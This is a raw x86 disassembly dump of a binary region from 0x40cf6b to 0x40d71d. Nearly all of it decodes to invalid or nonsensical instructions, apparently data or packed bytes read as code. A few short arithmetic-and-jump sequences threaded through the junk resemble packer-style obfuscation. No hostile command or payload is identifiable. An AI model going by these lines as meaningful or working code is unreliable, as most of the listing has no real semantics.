  40cf6b:	mov    esi,ecx
  40cf6d:	std    
  40cf6e:	mov    edi,ds
  40cf70:	leave  
  40cf71:	(bad)  
  40cf72:	loopne 0x40cf00
  40cf74:	adc    eax,0xdc4f8def
  40cf79:	adc    ebp,0xffffff83
  40cf7c:	and    DWORD PTR [ebx-0x60fe65bf],0x624cc48e
  40cf86:	icebp  
  40cf87:	and    al,0xb
  40cf89:	arpl   WORD PTR [ebx+edx*4],si
  40cf8c:	inc    eax
  40cf8d:	jmp    0x4911:0xe120fea7
  40cf94:	shl    al,1
  40cf96:	and    eax,0xcbefb765
  40cf9b:	adc    bh,0xcb
  40cf9e:	mov    ds:0x20f64893,al
  40cfa3:	cdq    
  40cfa4:	push   0x251b7121
  40cfa9:	inc    edx
  40cfaa:	sub    cl,BYTE PTR [edx]
  40cfac:	out    dx,al
  40cfad:	mov    esp,0xa19b42f7
  40cfb2:	push   ebp
  40cfb3:	imul   edi,DWORD PTR [ebx],0xa
  40cfb6:	adc    eax,0xd3d6f92e
  40cfbb:	lds    esp,FWORD PTR [ebx+esi*1-0x44]
  40cfbf:	xor    DWORD PTR [eax+0x2e2d1022],edx
  40cfc5:	sbb    al,0xdd
  40cfc7:	(bad)  
  40cfc8:	jmp    0x3af3ea57
  40cfcd:	cmp    BYTE PTR [ebx],cl
  40cfcf:	test   ebp,ebx
  40cfd1:	push   ss
  40cfd2:	call   0xdeb657ef
  40cfd7:	mov    WORD PTR [edx+0x2aed1bc9],?
  40cfdd:	into   
  40cfde:	pop    eax
  40cfdf:	xlat   BYTE PTR ds:[ebx]
  40cfe0:	cmp    al,0x45
  40cfe2:	xor    DWORD PTR [ebx],ecx
  40cfe4:	int    0x3f
  40cfe6:	in     al,dx
  40cfe7:	aaa    
  40cfe8:	lahf   
  40cfe9:	push   ss
  40cfea:	push   ss
  40cfeb:	fdivr  DWORD PTR [edi-0x5f]
  40cfee:	xor    DWORD PTR ds:0xec874752,0xfffffff8
  40cff5:	jno    0x40cffa
  40cff7:	pop    ds
  40cff8:	aad    0x2f
  40cffa:	nop
  40cffb:	or     bh,dh
  40cffd:	iret   
  40cffe:	mov    ebx,0xd5e5aebf
  40d003:	and    bh,BYTE PTR [edx-0x65]
  40d006:	jae    0x40cfd3
  40d008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d009:	cli    
  40d00a:	ficom  DWORD PTR [eax]
  40d00c:	aas    
  40d00d:	mov    eax,ds:0x8260bb01
  40d012:	ins    BYTE PTR es:[edi],dx
  40d013:	adc    dl,bl
  40d015:	nop
  40d016:	out    0x4c,al
  40d018:	out    dx,al
  40d019:	pop    ebx
  40d01a:	xchg   edi,eax
  40d01b:	and    edi,DWORD PTR [esp+ebx*2+0x4f]
  40d01f:	cmp    ch,bl
  40d021:	test   bl,dh
  40d023:	ins    DWORD PTR es:[edi],dx
  40d024:	or     al,0x2a
  40d026:	xchg   ecx,eax
  40d027:	repnz add al,0x29
  40d02a:	jns    0x40cfe2
  40d02c:	call   0x39c1:0x6f48fe4c
  40d033:	or     esp,DWORD PTR [ebp-0x6a45ee5f]
  40d039:	mov    bh,0x9f
  40d03b:	add    DWORD PTR [esi+0x13],ebx
  40d03e:	in     al,dx
  40d03f:	test   al,0x9f
  40d041:	test   BYTE PTR [edi+0x1b],cl
  40d044:	mov    ah,0x31
  40d046:	jl     0x40d04f
  40d048:	lea    esi,[esi+0x15]
  40d04b:	ss sub eax,0x2b2d2cc1
  40d051:	mov    al,ds:0x2da005c9
  40d056:	push   edx
  40d057:	and    BYTE PTR [ebx],ah
  40d059:	and    BYTE PTR [ebx+0x799710d],cl
  40d05f:	add    BYTE PTR [eax+ecx*8-0x43129dc9],0x65
  40d067:	jl     0x664f9b1f
  40d06d:	push   edi
  40d06e:	push   ebp
  40d06f:	push   0x665b09aa
  40d074:	inc    ebx
  40d075:	pop    eax
  40d076:	push   ds
  40d077:	add    ebp,esi
  40d079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07a:	into   
  40d07b:	in     al,dx
  40d07c:	(bad)  
  40d07d:	or     al,0x10
  40d07f:	retf   0x394f
  40d082:	mov    edx,0xd27be5a0
  40d087:	adc    eax,0xca8cb15b
  40d08c:	test   eax,0xc5724050
  40d091:	(bad)  
  40d092:	fcomp  DWORD PTR [eax+0x76]
  40d095:	sbb    BYTE PTR [ebx+ebp*2],dh
  40d098:	mov    al,0x3d
  40d09a:	jg     0x40d0c2
  40d09c:	sub    BYTE PTR [edx],dl
  40d09e:	push   ds
  40d09f:	idiv   DWORD PTR [ebx-0x3bbe41fc]
  40d0a5:	inc    ebp
  40d0a6:	cmp    al,0x18
  40d0a8:	push   eax
  40d0a9:	push   0xffffffc6
  40d0ab:	mov    dl,0x64
  40d0ad:	repz xchg sp,ax
  40d0b0:	fld    TBYTE PTR [ecx]
  40d0b2:	adc    DWORD PTR [ebx-0x3],eax
  40d0b5:	mov    bl,0xd9
  40d0b7:	mov    bh,0x8e
  40d0b9:	imul   edx,DWORD PTR [ecx],0x2
  40d0bc:	fdiv   QWORD PTR [ecx-0x10]
  40d0bf:	arpl   WORD PTR [eax+0x37b94cc4],sp
  40d0c5:	out    0xc5,al
  40d0c7:	mov    DWORD PTR [ebp-0x527668f9],0x9c9097c1
  40d0d1:	out    0x1e,al
  40d0d3:	push   ss
  40d0d4:	cli    
  40d0d5:	mov    ebp,0xc3622d0e
  40d0da:	pop    es
  40d0db:	jnp    0x40d11b
  40d0dd:	cmp    eax,0xea1607a3
  40d0e2:	jo     0x40d0bb
  40d0e4:	jb     0x40d111
  40d0e6:	sub    BYTE PTR [edx-0x31],al
  40d0e9:	xchg   ebx,eax
  40d0ea:	push   ss
  40d0eb:	and    al,0xa9
  40d0ed:	fsubr  QWORD PTR [ebx-0x5b]
  40d0f0:	adc    al,0x98
  40d0f2:	jge    0x40d159
  40d0f4:	cmp    BYTE PTR [ecx],dl
  40d0f6:	fsubrp st(6),st
  40d0f8:	mov    ds:0x904f4cfd,eax
  40d0fd:	addr16 into 
  40d0ff:	std    
  40d100:	pop    ebx
  40d101:	pushf  
  40d102:	cmp    eax,0x749e5313
  40d107:	call   0xa75f09a7
  40d10c:	imul   ebx,DWORD PTR [edi+0x379a14e2],0xfc99d497
  40d116:	xor    ebp,DWORD PTR [eax+0x6]
  40d119:	pop    eax
  40d11a:	fcmovnb st,st(7)
  40d11c:	mov    ebp,DWORD PTR [ebx-0x6f]
  40d11f:	imul   esi,DWORD PTR [ebp+eax*4-0x14],0x24b32ef2
  40d127:	cmp    esp,DWORD PTR [ecx]
  40d129:	jmp    0x66c51bd8
  40d12e:	outs   dx,DWORD PTR ds:[esi]
  40d12f:	or     DWORD PTR [edi+0x3a7f6c96],0x6e
  40d136:	ror    BYTE PTR ds:0xb7de6bb8,1
  40d13c:	xor    BYTE PTR [esi+0x17c6ec9c],bh
  40d142:	adc    dl,al
  40d144:	inc    ebp
  40d145:	sbb    dh,ch
  40d147:	not    DWORD PTR [esp+esi*2-0x2aad7ace]
  40d14e:	sub    al,0x85
  40d150:	sbb    bl,ah
  40d152:	in     al,0xaa
  40d154:	mov    ebx,0x2d9df6c1
  40d159:	and    cl,BYTE PTR [ebx-0x39613f9f]
  40d15f:	(bad)  [ebx]
  40d161:	dec    ebx
  40d162:	inc    eax
  40d163:	xchg   edx,eax
  40d164:	push   es
  40d165:	pop    eax
  40d166:	mov    bh,BYTE PTR [ebp+0x77b077dd]
  40d16c:	adc    cl,BYTE PTR [ebp-0x64]
  40d16f:	shl    BYTE PTR [esi+0xdf7d7ba],1
  40d175:	mov    bl,0x89
  40d177:	pop    ebx
  40d178:	dec    esi
  40d179:	in     al,0xf
  40d17b:	sbb    BYTE PTR ss:[eax],ah
  40d17e:	ins    DWORD PTR es:[edi],dx
  40d17f:	(bad)  
  40d180:	xor    eax,0xcd930e20
  40d185:	stc    
  40d186:	inc    eax
  40d187:	(bad)  
  40d188:	loop   0x40d1f4
  40d18a:	pop    eax
  40d18b:	or     DWORD PTR [edx-0xd],esi
  40d18e:	imul   BYTE PTR ds:0x1317b7b2
  40d194:	rcr    DWORD PTR [ecx],1
  40d196:	in     al,dx
  40d197:	xchg   esp,eax
  40d198:	cs mov fs:0xc290522b,eax
  40d19f:	mov    bl,0x19
  40d1a1:	add    esi,DWORD PTR ds:0x9ff3de7b
  40d1a7:	mov    ecx,0x1bd2ac33
  40d1ac:	call   0xfaf5:0x57898b3d
  40d1b3:	scas   al,BYTE PTR es:[edi]
  40d1b4:	retf   
  40d1b5:	jle    0x40d17f
  40d1b7:	mov    ds:0xbfaf9f51,eax
  40d1bc:	daa    
  40d1bd:	sub    eax,0x463f86d3
  40d1c2:	lds    esi,FWORD PTR [ebp-0x3e7dedf5]
  40d1c8:	push   edi
  40d1c9:	lahf   
  40d1ca:	cdq    
  40d1cb:	shl    DWORD PTR [edi+0x2f],0xed
  40d1cf:	sbb    al,0x46
  40d1d1:	lock xlat BYTE PTR ds:[ebx]
  40d1d3:	shl    edi,cl
  40d1d5:	adc    DWORD PTR [ebx],ecx
  40d1d7:	mov    al,ds:0xddeabb6f
  40d1dc:	js     0x40d201
  40d1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	(bad)  
  40d210:	and    edx,DWORD PTR [edi]
  40d212:	(bad)  
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	enter  0x2d39,0xe1
  40d21e:	ret    
  40d21f:	and    al,0x85
  40d221:	jo     0x40d23e
  40d223:	adc    edi,DWORD PTR [ecx-0x6e]
  40d226:	add    cl,dh
  40d228:	loope  0x40d282
  40d22a:	test   eax,0xae023a4
  40d22f:	ficomp DWORD PTR [ecx]
  40d231:	mov    ch,0x64
  40d233:	xchg   BYTE PTR [esi-0x5e],al
  40d236:	sub    ah,dh
  40d238:	int    0x9
  40d23a:	cmp    BYTE PTR [eax+edi*2+0x3d1316e5],ch
  40d241:	and    dh,BYTE PTR [ebx-0x57]
  40d244:	push   0xb4dec34b
  40d249:	ror    BYTE PTR [esi+0x1c88018a],cl
  40d24f:	inc    ebx
  40d250:	inc    ebp
  40d251:	add    DWORD PTR [ecx-0x21],0xffffffec
  40d255:	xchg   ebx,eax
  40d256:	iret   
  40d257:	adc    eax,0x5e
  40d25a:	add    eax,0x53dfcb7c
  40d25f:	or     al,0x1d
  40d261:	cmp    edi,0x2fe3f33a
  40d267:	sbb    bh,bh
  40d269:	inc    eax
  40d26a:	sub    dh,bh
  40d26c:	leave  
  40d26d:	ja     0x40d2a0
  40d26f:	inc    ebx
  40d270:	lahf   
  40d271:	aas    
  40d272:	dec    eax
  40d273:	hlt    
  40d274:	(bad)  ds:0x20146b9a
  40d27a:	pop    ds
  40d27b:	adc    BYTE PTR [edi-0x669157c1],dh
  40d281:	jns    0x40d2ef
  40d283:	(bad)  
  40d284:	arpl   WORD PTR [eax],di
  40d286:	cmp    eax,esi
  40d288:	sbb    BYTE PTR ds:0x64c8729,dl
  40d28e:	jmp    0x40d2a4
  40d290:	add    ebp,eax
  40d292:	jl     0x40d2c5
  40d294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d295:	aaa    
  40d296:	jp     0x40d2d3
  40d298:	sub    BYTE PTR [eax],bl
  40d29a:	leave  
  40d29b:	aaa    
  40d29c:	xchg   ebx,eax
  40d29d:	xchg   esi,eax
  40d29e:	lods   al,BYTE PTR ds:[esi]
  40d29f:	(bad)  
  40d2a0:	mov    dh,0x85
  40d2a2:	sub    ebp,eax
  40d2a4:	pushf  
  40d2a5:	mul    ebx
  40d2a7:	jbe    0x40d2a0
  40d2a9:	dec    esp
  40d2aa:	dec    edx
  40d2ab:	jb     0x40d2a4
  40d2ad:	aas    
  40d2ae:	sub    BYTE PTR [ecx+0x6de80a75],al
  40d2b4:	inc    esp
  40d2b5:	mov    al,0xa6
  40d2b7:	or     ch,BYTE PTR ds:0x749d0066
  40d2bd:	jge    0x40d28f
  40d2bf:	ja     0x40d25c
  40d2c1:	(bad)  
  40d2c2:	fcmovbe st,st(7)
  40d2c4:	or     BYTE PTR [eax+0x4e22ac64],al
  40d2ca:	int3   
  40d2cb:	sahf   
  40d2cc:	xchg   ebx,eax
  40d2cd:	mov    edx,0xc9767b40
  40d2d2:	mov    WORD PTR [ecx+0x64e838e3],ds
  40d2d8:	loopne 0x40d283
  40d2da:	xor    BYTE PTR [ebp-0x412e6734],0x0
  40d2e1:	dec    edx
  40d2e2:	loopne 0x40d2c4
  40d2e4:	lds    esi,FWORD PTR [edx-0x629822ca]
  40d2ea:	ja     0x40d2e1
  40d2ec:	clc    
  40d2ed:	mov    ah,0x31
  40d2ef:	stc    
  40d2f0:	data16 cld 
  40d2f2:	leave  
  40d2f3:	pop    ebp
  40d2f4:	or     ebx,ebp
  40d2f6:	mov    bh,0xaa
  40d2f8:	xchg   ecx,eax
  40d2f9:	push   0x49
  40d2fb:	xlat   BYTE PTR ds:[ebx]
  40d2fc:	shl    DWORD PTR [esp+0x39],cl
  40d300:	inc    eax
  40d301:	pop    esi
  40d302:	add    DWORD PTR [ebx],0xe53a9115
  40d308:	scas   al,BYTE PTR es:[edi]
  40d309:	fistp  DWORD PTR ds:0x1fc95ecc
  40d30f:	jecxz  0x40d31f
  40d311:	add    ebx,DWORD PTR [eax]
  40d313:	inc    esp
  40d314:	xchg   esp,eax
  40d315:	jno    0x40d29e
  40d317:	jae    0x40d2ba
  40d319:	ins    BYTE PTR es:[edi],dx
  40d31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d31c:	push   ss
  40d31d:	pop    es
  40d31e:	push   0xffffffea
  40d320:	xchg   esi,eax
  40d321:	addr16 xor ax,0x245f
  40d326:	or     bl,al
  40d328:	xor    DWORD PTR [ebx+0x4e],eax
  40d32b:	fisubr DWORD PTR [edi]
  40d32d:	xchg   ecx,eax
  40d32e:	clc    
  40d32f:	jbe    0x40d354
  40d331:	or     DWORD PTR [edi+ebx*1+0x4bf31432],0xffffff85
  40d339:	add    eax,0x5f0f1291
  40d33e:	adc    DWORD PTR [ebx-0x37],esi
  40d341:	mov    cl,0x3e
  40d343:	daa    
  40d344:	or     BYTE PTR [edi+eiz*4],dl
  40d347:	add    eax,0x38a9caa
  40d34c:	pop    ebp
  40d34d:	pusha  
  40d34e:	cdq    
  40d34f:	sbb    al,0x59
  40d351:	in     al,0x41
  40d353:	pop    eax
  40d354:	std    
  40d355:	loopne 0x40d369
  40d357:	mov    dh,0x2a
  40d359:	out    0x7,al
  40d35b:	outs   dx,BYTE PTR ds:[esi]
  40d35c:	mov    eax,ds:0x4bf8c96f
  40d361:	dec    eax
  40d362:	add    ecx,DWORD PTR [ebp+ebx*1+0x67]
  40d366:	aas    
  40d367:	ins    DWORD PTR es:[edi],dx
  40d368:	cdq    
  40d369:	sahf   
  40d36a:	cdq    
  40d36b:	repz mov al,ds:0x22d28ba9
  40d371:	mov    ebx,DWORD PTR [ebx+0xb2e4737]
  40d377:	std    
  40d378:	test   DWORD PTR [eax+0x37],edi
  40d37b:	sbb    DWORD PTR [ebx],edx
  40d37d:	aaa    
  40d37e:	call   0xa038f788
  40d383:	mov    esp,0x14a8d4e4
  40d388:	ret    0x318a
  40d38b:	xchg   esp,eax
  40d38c:	mov    WORD PTR [esi-0x16],fs
  40d38f:	jo     0x40d3b2
  40d391:	xchg   DWORD PTR [ecx],esp
  40d393:	pop    eax
  40d394:	dec    edi
  40d395:	outs   dx,DWORD PTR ds:[esi]
  40d396:	xchg   ecx,eax
  40d397:	std    
  40d398:	rcr    DWORD PTR [ebp-0x70],cl
  40d39b:	(bad)  
  40d39c:	xchg   edi,eax
  40d39d:	and    al,0xab
  40d39f:	push   esp
  40d3a0:	xchg   esi,eax
  40d3a1:	(bad)  
  40d3a2:	stos   BYTE PTR es:[edi],al
  40d3a3:	repnz mov esp,0x434b98d6
  40d3a9:	aam    0x8a
  40d3ab:	pop    esp
  40d3ac:	aad    0xb5
  40d3ae:	mov    edx,?
  40d3b0:	out    0xee,eax
  40d3b2:	jle    0x40d3c1
  40d3b4:	or     al,0x6e
  40d3b6:	inc    edx
  40d3b7:	mov    esi,0x55a7b9ca
  40d3bd:	jmp    0xd1b7:0x3d4e5ff
  40d3c4:	aaa    
  40d3c5:	mov    al,0xea
  40d3c7:	das    
  40d3c8:	scas   eax,DWORD PTR es:[edi]
  40d3c9:	imul   ecx,DWORD PTR [esi+0x1eea4746],0xb47c630c
  40d3d3:	jp     0x40d3fd
  40d3d5:	fs and al,0xee
  40d3d8:	mov    BYTE PTR [ebp+0x1ec99de0],al
  40d3de:	ss retf 0x505c
  40d3e2:	(bad)
  40d3e5:	stos   DWORD PTR es:[edi],eax
  40d3e6:	or     eax,DWORD PTR [eax-0x1587158d]
  40d3ec:	jmp    0x40d405
  40d3ee:	mov    bh,0x54
  40d3f0:	pop    ebp
  40d3f1:	mov    cl,0x1b
  40d3f3:	and    BYTE PTR [eax-0x397ca8c0],bl
  40d3f9:	mov    al,0xb8
  40d3fb:	inc    ebp
  40d3fc:	loope  0x40d3f0
  40d3fe:	push   ds
  40d3ff:	jecxz  0x40d42a
  40d401:	(bad)  [ebx+0x6f443a83]
  40d407:	repnz lahf 
  40d409:	pop    esp
  40d40a:	jne    0x40d39d
  40d40c:	mov    bh,0xef
  40d40e:	xor    edi,ecx
  40d410:	adc    al,0x3b
  40d412:	add    BYTE PTR [ebx+eiz*4+0x797846e5],al
  40d419:	(bad)  
  40d41b:	cmp    al,0xec
  40d41d:	jnp    0x40d47e
  40d41f:	out    dx,al
  40d420:	add    DWORD PTR [edx-0x9],eax
  40d423:	jb     0x40d40d
  40d425:	mov    cl,0x40
  40d427:	mov    eax,ds:0x689675f7
  40d42c:	mov    dl,0x55
  40d42e:	lea    esp,[ecx]
  40d430:	push   ds
  40d431:	cmp    BYTE PTR [edx+0x652d5742],dl
  40d437:	mov    al,ds:0xff08583b
  40d43c:	(bad)  
  40d43d:	in     al,dx
  40d43e:	dec    edi
  40d43f:	mov    dl,0xde
  40d441:	iret   
  40d442:	inc    esi
  40d443:	aad    0x27
  40d445:	gs clc 
  40d447:	ror    BYTE PTR [edi-0x35e8cd84],cl
  40d44d:	push   ebp
  40d44e:	fdiv   QWORD PTR [ecx+0xb2cc2f8]
  40d454:	pop    edx
  40d455:	fstp   DWORD PTR [ecx-0x164aeef4]
  40d45b:	cmp    al,0xab
  40d45d:	xchg   ecx,eax
  40d45e:	add    bl,BYTE PTR [eax-0x7f]
  40d461:	add    al,0xd1
  40d463:	add    BYTE PTR [eax+0x4aa1f991],0xe5
  40d46a:	xchg   esp,eax
  40d46b:	cmc    
  40d46c:	in     eax,0x4d
  40d46e:	stc    
  40d46f:	xchg   ebx,eax
  40d470:	fild   DWORD PTR [ebx+eiz*2]
  40d473:	and    dh,bh
  40d475:	and    ah,BYTE PTR [edx+esi*1+0x3bc1f65f]
  40d47c:	mov    eax,0x62fc0ef7
  40d481:	jp     0x40d45f
  40d483:	mov    fs,WORD PTR [ebx-0x35]
  40d486:	addr16 inc esi
  40d488:	ret    0x8120
  40d48b:	inc    ecx
  40d48c:	sub    eax,0x591f44d5
  40d491:	jmp    0x7dc6:0xb57af1aa
  40d498:	push   esp
  40d499:	dec    esi
  40d49a:	cld    
  40d49b:	lock mov ecx,ecx
  40d49e:	in     eax,0x76
  40d4a0:	ins    BYTE PTR es:[edi],dx
  40d4a1:	fdiv   QWORD PTR [esi+0x213f2d5d]
  40d4a7:	mov    eax,0x9e81e5f3
  40d4ac:	imul   edx,DWORD PTR [esi],0x3f
  40d4af:	xor    DWORD PTR [ecx],0x23
  40d4b2:	hlt    
  40d4b3:	je     0x40d4fa
  40d4b5:	stos   BYTE PTR es:[edi],al
  40d4b6:	mov    BYTE PTR [edx-0x6845b148],dl
  40d4bc:	gs push ss
  40d4be:	scas   eax,DWORD PTR es:[edi]
  40d4bf:	iret   
  40d4c0:	test   DWORD PTR [edi+0x22159dec],ebx
  40d4c6:	sub    al,0x38
  40d4c8:	ret    
  40d4c9:	and    esi,DWORD PTR [edi]
  40d4cb:	mov    esp,0xe0794108
  40d4d0:	inc    ebx
  40d4d1:	jmp    0x40d4d5
  40d4d3:	lahf   
  40d4d4:	or     eax,DWORD PTR [esi-0x445ce347]
  40d4da:	sub    ecx,DWORD PTR ds:[esi+0x38ce0d18]
  40d4e1:	adc    al,0x3f
  40d4e3:	das    
  40d4e4:	mov    bh,0x97
  40d4e6:	jno    0x40d566
  40d4e8:	repnz mov esp,ebx
  40d4eb:	mov    cl,0x9a
  40d4ed:	push   cs
  40d4ee:	mov    ch,0x7b
  40d4f0:	es repnz push edx
  40d4f3:	ja     0x40d55d
  40d4f5:	add    eax,0xb49a523e
  40d4fa:	push   es
  40d4fb:	xor    ebx,ecx
  40d4fd:	pop    esi
  40d4fe:	push   esi
  40d4ff:	cmc    
  40d500:	jnp    0x40d4dd
  40d502:	or     eax,0xdbfdfaba
  40d507:	lods   eax,DWORD PTR ds:[esi]
  40d508:	cs jle 0x40d4bd
  40d50b:	lods   eax,DWORD PTR ds:[esi]
  40d50c:	push   DWORD PTR [eax-0x161e3e76]
  40d512:	mov    WORD PTR [ebx+ecx*1-0x190d952a],?
  40d519:	out    dx,al
  40d51a:	dec    edx
  40d51b:	xor    eax,DWORD PTR [ebx+edi*4]
  40d51e:	mov    DWORD PTR [edi-0x6905531b],ebx
  40d524:	jmp    0x3e6d4c79
  40d529:	adc    BYTE PTR [eax],dl
  40d52b:	xchg   ebx,eax
  40d52c:	retf   0x2dda
  40d52f:	icebp  
  40d530:	popf   
  40d531:	push   ds
  40d532:	push   ebx
  40d533:	pop    esp
  40d534:	mov    dh,0x99
  40d536:	inc    edi
  40d537:	xchg   BYTE PTR ss:0xee414996,dh
  40d53e:	adc    DWORD PTR [eax+0x12],edi
  40d541:	jbe    0x40d5bb
  40d543:	mov    bh,0xe8
  40d545:	iret   
  40d546:	mov    ah,BYTE PTR [eax]
  40d548:	cmp    BYTE PTR [ebx+ebp*2],bl
  40d54b:	int3   
  40d54c:	js     0x40d513
  40d54e:	xor    ah,ah
  40d550:	rcl    ecx,cl
  40d552:	int    0xab
  40d554:	ja     0x40d573
  40d556:	adc    dl,BYTE PTR [edx+0x56]
  40d559:	jo     0x40d583
  40d55b:	ror    BYTE PTR [eax-0x31c64f66],0x47
  40d562:	rcl    BYTE PTR [ebx-0x2457492],cl
  40d568:	xchg   esi,eax
  40d569:	xchg   DWORD PTR [eax],ebx
  40d56b:	add    BYTE PTR [esi-0x22],bh
  40d56e:	(bad)  [edi+ebx*2]
  40d571:	dec    ebp
  40d572:	(bad)  
  40d573:	push   cs
  40d574:	lock cwde 
  40d576:	jl     0x40d5e7
  40d578:	push   esp
  40d579:	and    eax,0x9aa9ba92
  40d57e:	or     BYTE PTR [ebx+ebp*4],0x5b
  40d582:	(bad)  
  40d583:	shl    BYTE PTR [edx-0x66],1
  40d586:	dec    ecx
  40d587:	dec    edi
  40d588:	cmc    
  40d589:	fnstsw WORD PTR [esi]
  40d58b:	xor    eax,0x4fdb5075
  40d590:	add    eax,0xccfd8383
  40d595:	cli    
  40d596:	jl     0x40d5b4
  40d598:	imul   DWORD PTR [eax+0x4cd3facc]
  40d59e:	mov    ecx,0xe3851f8f
  40d5a3:	jp     0x40d5ef
  40d5a5:	mov    eax,ebx
  40d5a7:	loop   0x40d586
  40d5a9:	adc    BYTE PTR [ebp-0x766a23af],ah
  40d5af:	std    
  40d5b0:	test   eax,0xbb0b9984
  40d5b5:	adc    eax,0xcf7bc3f8
  40d5ba:	adc    edi,edx
  40d5bc:	cmp    edx,DWORD PTR [ebx+0x48]
  40d5bf:	jno    0x40d5ed
  40d5c1:	xchg   edi,eax
  40d5c2:	mov    dl,0x0
  40d5c4:	fsub   QWORD PTR [edx-0x5472daa]
  40d5ca:	frstor [ebx-0x3748fad4]
  40d5d0:	inc    edi
  40d5d1:	fcom   st(1)
  40d5d3:	pusha  
  40d5d4:	rol    edx,cl
  40d5d6:	push   esi
  40d5d7:	into   
  40d5d8:	cmc    
  40d5d9:	sbb    DWORD PTR [esi-0x44],ebx
  40d5dc:	repnz push ds
  40d5de:	mov    ecx,0x64e7db6
  40d5e3:	cmp    al,0xd2
  40d5e5:	xor    al,0xa2
  40d5e7:	mov    dl,0xf7
  40d5e9:	pop    edx
  40d5ea:	cmp    al,bh
  40d5ec:	mov    eax,0xed7b2602
  40d5f1:	(bad)  
  40d5f3:	add    BYTE PTR [ebx+0x5a],0xa
  40d5f7:	sub    dh,dl
  40d5f9:	mov    edx,DWORD PTR [edx]
  40d5fb:	xor    BYTE PTR [edi+0x56],bh
  40d5fe:	add    al,0xf7
  40d600:	ror    BYTE PTR [ebp+0x29f8f186],cl
  40d606:	adc    al,0x6
  40d608:	and    esp,DWORD PTR [edx]
  40d60a:	(bad)  
  40d60b:	xchg   ecx,eax
  40d60c:	dec    eax
  40d60d:	or     dh,BYTE PTR [esi+0x1d]
  40d610:	adc    ah,BYTE PTR [edx]
  40d612:	mov    dl,0xce
  40d614:	xor    ebx,eax
  40d616:	sub    edx,ecx
  40d618:	lea    edi,[edi+ebx*1+0x327299]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x46cc7b98
  40d64b:	xor    eax,0x7e7ea638
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	push   edi
  40d655:	jmp    FWORD PTR [edi-0x4834120e]
  40d65b:	fwait
  40d65c:	in     eax,dx
  40d65d:	psubusw mm5,QWORD PTR [edi+0x12]
  40d661:	add    esp,DWORD PTR [eax-0xa02d8df]
  40d667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d668:	int    0xeb
  40d66a:	loope  0x40d652
  40d66c:	adc    dh,BYTE PTR [eax-0x7a]
  40d66f:	adc    eax,esp
  40d671:	pop    esi
  40d672:	into   
  40d673:	int3   
  40d674:	push   cs
  40d675:	in     al,dx
  40d676:	jns    0x40d6cd
  40d678:	call   0x2557:0x1e0351cf
  40d67f:	lea    ebx,[ecx+eiz*2]
  40d682:	call   0x2f15:0x990a416e
  40d689:	daa    
  40d68a:	hlt    
  40d68b:	push   ds
  40d68c:	sub    al,ch
  40d68e:	iret   
  40d68f:	repz (bad) 
  40d691:	ror    DWORD PTR [ecx+0x487c6e25],cl
  40d697:	xor    dh,ah
  40d699:	bound  edi,QWORD PTR [ebx]
  40d69b:	fistp  DWORD PTR ds:0x131b0342
  40d6a1:	push   eax
  40d6a2:	data16 mov al,0x3e
  40d6a5:	adc    eax,0x57f5fdfa
  40d6aa:	push   edx
  40d6ab:	sbb    DWORD PTR [ecx+eiz*2],eax
  40d6ae:	inc    BYTE PTR [edx+0x7c5ee7c4]
  40d6b4:	cld    
  40d6b5:	or     cl,BYTE PTR [ebx+0x2d5a6de0]
  40d6bb:	or     ebp,eax
  40d6bd:	dec    esp
  40d6be:	ret    0xd58b
  40d6c1:	fcmovne st,st(3)
  40d6c3:	fcmovnbe st,st(2)
  40d6c5:	mov    cl,ch
  40d6c7:	add    eax,0xe913aeae
  40d6cc:	ss jecxz 0x40d6bb
  40d6cf:	ror    DWORD PTR [edi+0x150acaa8],0x7f
  40d6d6:	cmp    ecx,eax
  40d6d8:	mov    esp,0x4c1ebcd1
  40d6dd:	std    
  40d6de:	call   0x460c5376
  40d6e3:	sbb    DWORD PTR [edx-0x776d3688],edi
  40d6e9:	ins    DWORD PTR es:[edi],dx
  40d6ea:	pop    es
  40d6eb:	sbb    ah,BYTE PTR [esp+ebx*4-0x63]
  40d6ef:	mov    ds:0xd2f0edea,eax
  40d6f4:	mov    eax,ebx
  40d6f6:	xor    BYTE PTR [eax+0xe],ah
  40d6f9:	ss sub ecx,edi
  40d6fc:	jae    0x40d686
  40d6fe:	mov    ah,0x3d
  40d700:	(bad)  
  40d702:	popa   
  40d703:	into   
  40d704:	pop    es
  40d705:	pop    ebp
  40d706:	xor    edx,esi
  40d708:	pop    ebp
  40d709:	inc    eax
  40d70a:	xchg   dh,cl
  40d70c:	cli    
  40d70d:	je     0x40d76a
  40d70f:	push   ss
  40d710:	(bad)  
  40d711:	sbb    eax,0xc8966020
  40d716:	or     BYTE PTR fs:0xc19218dc,ch
  40d71d:	stc    
